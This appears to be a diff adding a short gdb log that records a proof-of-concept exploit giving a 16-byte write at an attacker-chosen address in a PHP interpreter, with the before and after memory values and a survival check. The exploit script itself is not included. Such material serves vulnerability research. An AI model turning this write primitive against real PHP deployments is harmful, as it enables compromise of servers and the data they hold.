@@ -1,0 +1,7 @@
+== vdR2_write receipt: 16-byte write at attacker-chosen address, plain2 8.5.12, gdb ==
+cmd: gdb --args php -n vdR2_write.php 0140737308794880 0093824990838784 0140737308803072
+WRITE-TARGET 0x7ffff54c4fa0 BEFORE = 0x0
+WRITE-TARGET 0x7ffff54c4fa0 AFTER  = 0x7ffff5458900  (zend_reference* heap ptr; type_info@W+8 -> 0x30A)
+WRITE RECEIPT: *W changed
+outer ok=bool(true)
+SURVIVED
